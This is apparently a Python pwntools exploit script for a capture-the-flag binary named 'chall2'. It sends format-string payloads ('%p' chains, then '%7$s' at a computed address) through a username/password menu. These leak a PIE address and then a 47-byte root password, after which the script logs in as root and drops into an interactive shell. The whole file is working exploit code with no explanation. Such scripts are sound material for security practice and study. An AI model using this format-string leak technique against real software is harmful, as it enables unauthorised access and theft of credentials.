from pwn import *

while True:
    try: 
        binary = ELF("./chall2")
        r = process(binary.path)
        context.log_level='debug'
        #gdb.attach(r, api=True)

        payload = b""

        r.sendline(b"1")
        payload1 = b"%p..%p..%p..%p..%p..%p..%p..%p..%p..%p|%p|"
        payload2 = b"%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p"

        r.sendlineafter(b"Username: ", payload1)
        r.sendlineafter(b"Password: ", payload2)

        r.sendline(b"2")
        r.sendlineafter(b"Username: ", payload1)
        r.sendlineafter(b"Password: ", payload2)

        r.sendline(b"3")
        recv = int(r.recv().split(b"|")[1], 16)  # 0x558e40e5141d
        log.info("Main addr pie: " + hex(recv))
        main_offset_pie = 0x0000141d
        binary.address = recv - main_offset_pie
        log.info("Pie base addr: " + hex(binary.address))

        r.sendline(b"1")
        payload1 = p64(binary.address + 0x4110)
        payload2 = b"*|*%7$s*|*%p%p%p%p%p%p"
        r.sendlineafter(b"Username: ", payload1)
        r.sendlineafter(b"Password: ", payload2)
        r.recv()
        r.sendline(b"2")
        r.sendlineafter(b"Username: ", payload1)
        r.sendlineafter(b"Password: ", payload2)
        r.recv()
        r.sendline(b"3")
        recv = r.recv().split(b"*|*")[1]
        log.info(b"Password: " + recv)
        r.recv()

        if len(recv) == 47:
            log.info("pwned :3")
            r.sendline(b"1")
            payload1 = b"root"
            payload2 = recv
            r.sendlineafter(b"Username: ", payload1)
            r.sendlineafter(b"Password: ", payload2)
            r.sendline(b"2")
            r.sendlineafter(b"Username: ", payload1)
            r.sendlineafter(b"Password: ", payload2)
            r.sendline(b"3")
            r.sendline(b"4")
            r.sendline("ls")
            r.interactive()

            break
        else:
            r.close()
    except:
        continue
